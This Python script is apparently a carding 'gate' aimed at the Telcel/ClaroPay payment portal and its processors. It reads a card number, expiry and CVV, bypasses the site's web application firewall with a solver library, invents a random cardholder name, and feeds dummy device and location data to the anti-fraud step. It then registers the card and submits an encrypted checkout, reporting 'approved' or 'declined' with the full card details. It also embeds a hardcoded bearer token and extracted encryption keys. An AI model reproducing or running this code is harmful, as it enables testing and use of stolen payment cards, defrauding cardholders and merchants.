from curl_cffi.requests import Session
import requests, json, os, re, uuid, base64, random, datetime
from cryptography.hazmat.primitives import hashes, padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from wafSolver.stormCasterCse import StormCasterCSE


def cc(text):
    n, m, y, c = re.split(r'\s*[|/]\s*|\s+', text.strip())
    return {'number': n, 'month': m.zfill(2), 'year': y[-2:], 'cvv': c}

def genname():
    first = random.choice(['James','John','Robert','Michael','William','David','Richard','Joseph','Thomas','Charles'])
    last  = random.choice(['Smith','Johnson','Williams','Brown','Jones','Garcia','Miller','Davis','Rodriguez','Martinez'])
    return first, last

def decrypt_data(payload, password='ranDlathEMYraTEFulINmAgi'):
    salt, iv, ct = [base64.b64decode(x) for x in payload.split('|')]
    key = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=250000).derive(password.encode())
    dec = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
    unp = padding.PKCS7(128).unpadder()
    return json.loads((unp.update(dec.update(ct) + dec.finalize()) + unp.finalize()).decode())

def encrypt_data(obj, password='pd2oQTuQ6AFuFVAF'):
    salt, iv = os.urandom(16), os.urandom(16)
    key = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=250000).derive(password.encode())
    pad = padding.PKCS7(128).padder()
    enc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    ct  = enc.update(pad.update(json.dumps(obj, separators=(',', ':')).encode()) + pad.finalize()) + enc.finalize()
    return '|'.join(base64.b64encode(x).decode() for x in (salt, iv, ct))


def gate(card: str, cuenta: str):
    c = cc(card)
    num_cuenta = ''.join(d for d in cuenta if d.isdigit())
    first, last = genname()
    exp = f"{c['month']}{c['year']}"
    t1bearer = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiI0IiwianRpIjoiZjNhM2I4MjMwMWI1NzcyZDVmYjk2MThkZWZhNTZkY2M3ZmUxNDcwNDE1MzA0YTU5ZjIxNDgyOTBlZjZkMjgxNTM1MGRiYTY1OWQ3NzMzYzgiLCJpYXQiOjE3NzY3Mjc4MDQuMDA4MDMsIm5iZiI6MTc3NjcyNzgwNC4wMDgwMzIsImV4cCI6MTgzOTg4NjIwNC4wMDM5MDYsInN1YiI6IjcxIiwic2NvcGVzIjpbImNsaWVudGUtdGFyamV0YXMiLCJjbGllbnRlLWNsaWVudGVzIl19.kKYlWwJSK_ImR5mNtbHFKxzAnBK2srW6zMVxOmhrcET4L99yRWuXEnMLU_yHJThJtnCvlKeLhH9X5FfUOA1thdqdEXneYDpQabBuOn5lC7mgpZbsq6JSKs7hZ3PJabMTAkDalaTrBhlGehFU4P_VMlWSGo6EBuBs1-5c7IO-nevbJ9bMtDFB33CPAIGVsKQlefgxkAe70sP-vUP5r2uv0QaUiWS3PdOJ0UGwYYUlp0rDX54xNj9BH-2PfvsSxi99l-jzJ30_topOlpRlFGkld6xeJn_k7iH4M5FSk0EfcTedbMn6QCZtyh6k4UahWLLnk_aH8_BwkzUsr1PZaz8szDR5lP_s43-NgC8-Po41f3tJsmtB9L8pN3TYzF9Vpd4E2Gj321HLi1q2wwRgZnadAmlPq6_GyDzUkRfm0_J6nh7C21OFUnAn2sakCV_8SC6_vwHm2EhITNuFOauAlYwXyx6BttIUsPbm6U4QwPWg_YYZOkc_dnQ-YduUUSipsTwujB68ZFwbX8JB-bg9y_0ILsNhwoRtd98h3AUGff_oeYnhPKUt5VRwqKBpU9xhfx7-tQV5zVQU_jgPud9Y9FGTlE1nQsX6QQ9oi6gyKbb0df9JBvBr0_nZBxCYs0R5uRTwV7drIfexzFUtKAIK6RCrwWidbvWuE3fGEUtnOojhaeg'

    curl = Session(impersonate='chrome')
    cse  = StormCasterCSE(verbose=False)

    #Bypass WAF
    cse.solve(curl, 'https://pay.telcel.com/')

    #Barium -> saldo + claroId + access_token
    r1 = curl.get('https://pay.telcel.com/api/barium', headers={'accept': 'application/json, text/plain, */*','accept-language': 'es-ES,es;q=0.9','cp-bi': 'com.claropay.web.portalpagos','priority': 'u=1, i','referer': 'https://pay.telcel.com/amigoPaguitos/3?rsd=1','sec-ch-ua': '"Google Chrome";v="155", "Chromium";v="155", "Not(A:Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Linux"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36','uzlc': cse.get_uzlc({c_.name: c_.value for c_ in curl.cookies.jar}),}, params={'a': num_cuenta, 'b': 247})
    if r1.status_code != 200: return {'status': 'error', 'message': f'barium {r1.status_code}', 'body': r1.text[:300]}
    line = decrypt_data(r1.json()['data'])
    access_token = line['tokensDTO']['access_token']
    claro_id = line.get('claroId') or line.get('telcelInfo', {}).get('claroId', '')
    pending_amt = str(line.get('balance', {}).get('pendingAmount', ''))
    monto = pending_amt

    if not claro_id and access_token:
        try:
            import base64 as _b64
            jwt_payload = json.loads(_b64.urlsafe_b64decode(access_token.split('.')[1] + '=='))
            claro_id = jwt_payload.get('user_id', '')
        except Exception:
            pass
    if not claro_id or not access_token: return {'status': 'error', 'message': 'sin claroId/access_token'}

    #Iridium GET -> clienteId T1 (si ya existe)
    r2 = curl.get('https://pay.telcel.com/api/iridium', headers={'accept': '*/*','accept-language': 'es-ES,es;q=0.9','authorization': f'Bearer {access_token}','origin': 'https://pay.telcel.com','referer': 'https://pay.telcel.com/amigoPaguitos/3?rsd=1','sec-ch-ua': '"Google Chrome";v="155", "Chromium";v="155", "Not(A:Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Linux"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36','uzlc': cse.get_uzlc({c_.name: c_.value for c_ in curl.cookies.jar}),}, params={'query': 'findCustomerIDs', 'claroId': claro_id})
    client_id = None
    if r2.status_code in (200, 201):
        try:
            d = r2.json()
            client_id = d.get('customerId') or d.get('clientId') or d.get('id') or d.get('cliente_id') or (d.get('customers', [{}])[0].get('customerId') if d.get('customers') else None)
        except Exception: pass

    #Vesta -> tokeniza PAN
    r3 = requests.post('https://claropay.ecustomerpayments.com/GatewayV4ProxyJSON/Service/ChargeAccountToTemporaryToken', headers={'Referer': 'https://pay.telcel.com/','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36','Content-Type': 'application/json','sec-ch-ua': '"Google Chrome";v="155", "Chromium";v="155", "Not(A:Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Linux"',}, json={'AccountName': 'claropay', 'ChargeAccountNumber': c['number']})
    vesta_token = r3.json().get('ChargeAccountNumberToken', '') if r3.status_code == 200 else ''
    if not vesta_token: return {'status': 'error', 'message': 'sin token Vesta', 'body': r3.text[:300]}

    #T1Pagos cliente
    r4 = requests.post('https://api-claropay.t1pagos.com/v1/cliente', headers={'accept': '*/*','accept-language': 'es-ES,es;q=0.9','authorization': f'Bearer {t1bearer}','content-type': 'application/json','origin': 'https://pay.telcel.com','sec-ch-ua': '"Google Chrome";v="155", "Chromium";v="155", "Not(A:Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Linux"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'cross-site','user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36',}, json={'id_externo': claro_id})
    try: t4 = r4.json()
    except Exception: t4 = {}
    if r4.status_code in (200, 201):
        client_id = client_id or t4.get('data', {}).get('cliente', {}).get('id') or t4.get('id') or t4.get('clienteId')
    elif r4.status_code == 412:
        m = re.search(r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', t4.get('error', {}).get('message', ''))
        if m and not client_id: client_id = m.group(1)
    else:
        return {'status': 'error', 'message': f't1pagos cliente {r4.status_code}', 'body': r4.text[:300]}

    #T1Pagos tarjeta
    r5 = requests.post('https://api-claropay.t1pagos.com/v1/tarjeta', headers={'accept': '*/*','accept-language': 'es-ES,es;q=0.9','authorization': f'Bearer {t1bearer}','content-type': 'application/json','origin': 'https://pay.telcel.com','sec-ch-ua': '"Google Chrome";v="155", "Chromium";v="155", "Not(A:Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Linux"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'cross-site','user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36',}, json={'cargo_unico': False, 'cvv2': c['cvv'], 'default': False, 'expiracion_anio': c['year'], 'expiracion_mes': c['month'], 'nombre': f'{first} {last}', 'pan': c['number'], 'cliente_id': client_id})
    if r5.status_code not in (200, 201, 409, 412): return {'status': 'error', 'message': f't1pagos tarjeta {r5.status_code}', 'body': r5.text[:300]}
    try: t5 = r5.json()
    except Exception: t5 = {}
    card_token = t5.get('data', {}).get('tarjeta', {}).get('token') or t5.get('token') or t5.get('id') or vesta_token

    #Iridium POST -> vincula customer
    r6 = curl.post('https://pay.telcel.com/api/iridium', headers={'accept': '*/*','accept-language': 'es-ES,es;q=0.9','authorization': f'Bearer {access_token}','content-type': 'application/json','cp-bi': 'pay.telcel.com','cp-bv': '4.110.103','cp-so': 'web','origin': 'https://pay.telcel.com','referer': 'https://pay.telcel.com/amigoPaguitos/3?rsd=1','sec-ch-ua': '"Google Chrome";v="155", "Chromium";v="155", "Not(A:Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Linux"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36','uzlc': cse.get_uzlc({c_.name: c_.value for c_ in curl.cookies.jar}),}, json={'email': f'cp-0000000000-{uuid.uuid4()}@claropay.com', 'customer': {'claroId': claro_id, 'personId': claro_id, 'processor': 't1pagos', 'customerId': client_id}})
    if r6.status_code not in (200, 201, 204): return {'status': 'error', 'message': f'iridium vincula {r6.status_code}', 'body': r6.text[:300]}

    #Germanium -> registra tarjeta en ClaroPay
    r7 = curl.post('https://pay.telcel.com/api/germanium', headers={'accept': '*/*','accept-language': 'es-ES,es;q=0.9','authorization': f'Bearer {access_token}','content-type': 'application/json','cp-bi': 'pay.telcel.com','cp-bv': '4.110.103','cp-so': 'web','origin': 'https://pay.telcel.com','referer': 'https://pay.telcel.com/amigoPaguitos/3?rsd=1','sec-ch-ua': '"Google Chrome";v="155", "Chromium";v="155", "Not(A:Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Linux"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36','uzlc': cse.get_uzlc({c_.name: c_.value for c_ in curl.cookies.jar}),}, json={'msisdn': '0000000000', 'externalId': str(uuid.uuid4()), 'card': {'tokens': [{'platform': '1', 'value': card_token}], 'expirationDate': exp, 'lastDigits': c['number'][-4:], 'bin': c['number'][:6], 'mark': '2', 'acceptTermsAndConditions': True}, 'deviceData': None, 'canDeviceData': False, 'latitude': '0.0', 'longitude': '0.0', 'appVersion': '1.0', 'claroId': claro_id, 'name': f'{first} {last}', 'isDefault': '0', 'cardName': ''})
    if r7.status_code not in (200, 201, 204): return {'status': 'error', 'message': f'germanium {r7.status_code}', 'body': r7.text[:300]}

    #Fermium -> comision + cardId
    r8 = curl.post('https://pay.telcel.com/api/fermium', headers={'accept': '*/*','accept-language': 'es-ES,es;q=0.9','authorization': f'Bearer {access_token}','content-type': 'application/json','cp-bi': 'pay.telcel.com','cp-bv': '4.110.103','origin': 'https://pay.telcel.com','referer': 'https://pay.telcel.com/amigoPaguitos/3?rsd=1','sec-ch-ua': '"Google Chrome";v="155", "Chromium";v="155", "Not(A:Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Linux"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36','uzlc': cse.get_uzlc({c_.name: c_.value for c_ in curl.cookies.jar}),}, json={'appVersion': '1.0', 'externalId': str(uuid.uuid4()), 'claroId': claro_id, 'latitude': '0.0', 'longitude': '0.0', 'msisdn': '0000000000'})
    if r8.status_code not in (200, 201, 204): return {'status': 'error', 'message': f'fermium {r8.status_code}', 'body': r8.text[:300]}
    fermium = r8.json() if r8.content else {}
    commission = str(fermium.get('commission') or fermium.get('totalCommission') or '0')
    card_list = fermium.get('cardList', [])
    darm_token = card_token
    if card_list: darm_token = card_list[0].get('cardId') or card_list[0].get('card', {}).get('tokens', [{}])[0].get('value') or card_token

    #Hafnium -> antifraude
    curl.post('https://pay.telcel.com/api/hafnium/getSessionTags', headers={'accept': '*/*','accept-language': 'es-ES,es;q=0.9','authorization': f'Bearer {access_token}','content-type': 'application/json','origin': 'https://pay.telcel.com','referer': 'https://pay.telcel.com/amigoPaguitos/3?rsd=1','sec-ch-ua': '"Google Chrome";v="155", "Chromium";v="155", "Not(A:Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Linux"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36','uzlc': cse.get_uzlc({c_.name: c_.value for c_ in curl.cookies.jar}),}, json={'appVersion': '4.70.908', 'externalId': str(uuid.uuid4()), 'latitude': '0.0', 'longitude': '0.0', 'msisdn': '0000000000'})

    #Darmstatium -> checkout final (payload cifrado)
    checkout = {'accountHolder': {'accountCreateWebSessionID': '', 'accountCreationDate': datetime.date.today().isoformat(), 'accountHolderAddress': {'city': '', 'countryCodeId': '484', 'externalNumber': '', 'internalNumber': '', 'postalCode': '', 'region': '', 'street': '', 'suburb': ''}, 'birthdate': '', 'card': {'expirationDate': exp, 'lastDigits': c['number'][-4:], 'type': '2', 'mark': '2', 'tokens': [{'platform': 1, 'value': darm_token}], 'recurring': False, 'bins': c['number'][:6], 'cvv': c['cvv']}, 'firstName': first, 'governmentId': {'idNumber': '', 'idType': '2'}, 'lastName': last, 'secondLastName': ''}, 'appVersion': '1.0', 'checkPayment': True, 'claroId': claro_id, 'clientIdT1': client_id, 'control': str(uuid.uuid4().int)[:12], 'destinationAccountId': num_cuenta, 'deviceFingerprint': f'_0000000000_{uuid.uuid4().hex}_{uuid.uuid4().int & 0xFFFFFFFF}', 'externalId': str(uuid.uuid4()), 'inquiryTelmexId': '', 'isClaroSocio': False, 'latitude': '0.0', 'longitude': '0.0', 'makePayment': False, 'msisdn': '0000000000', 'paymentChannel': 7, 'paymentDescription': 'Pago desde portal telcel', 'paymentRoute': '1', 'productId': '', 'serviceId': '247', 'serviceName': 'AMIGO PAGUITOS', 'sessionId': f'S{uuid.uuid4().int >> 64}', 'totalAmount': str(monto), 'totalCommission': commission}
    r10 = curl.post('https://pay.telcel.com/api/darmstatium', headers={'accept': '*/*','accept-language': 'es-ES,es;q=0.9','authorization': f'Bearer {access_token}','content-type': 'application/json','cp-bi': 'pay.telcel.com','cp-bv': '4.110.103','cp-so': 'web','origin': 'https://pay.telcel.com','referer': 'https://pay.telcel.com/amigoPaguitos/3?rsd=1','sec-ch-ua': '"Google Chrome";v="155", "Chromium";v="155", "Not(A:Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Linux"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36','uzlc': cse.get_uzlc({c_.name: c_.value for c_ in curl.cookies.jar}),}, json={'data': encrypt_data(checkout)})
    try: resp = r10.json()
    except Exception: return {'status': 'error', 'message': f'darmstatium {r10.status_code}', 'body': r10.text[:300]}

    spi  = resp.get('servicePaymentInfo') or {}
    subj = resp.get('responseSubject', '')
    ok   = bool(spi) or subj == 'SUCCESS'
    return {'status':'approved 🟢' if ok else 'declined 🔴','gateway': 'Pago Factura/ClaroPay','message': resp.get('responseMessage'),'responseSubject': subj,'serviceName': spi.get('serviceName'),'chargeDate': spi.get('chargeDate'),'chargeAmount': spi.get('chargeAmount'),'folioProvisioning': spi.get('folioProvisioning'),'pendingAmount': pending_amt,'card': f'{c["number"]}|{c["month"]}|{c["year"]}|{c["cvv"]}','cuenta': num_cuenta}


run = gate(input('cc (pan|mm|yy|cvv): '), input('cuenta: '))
print(json.dumps(run, indent=4, ensure_ascii=False))
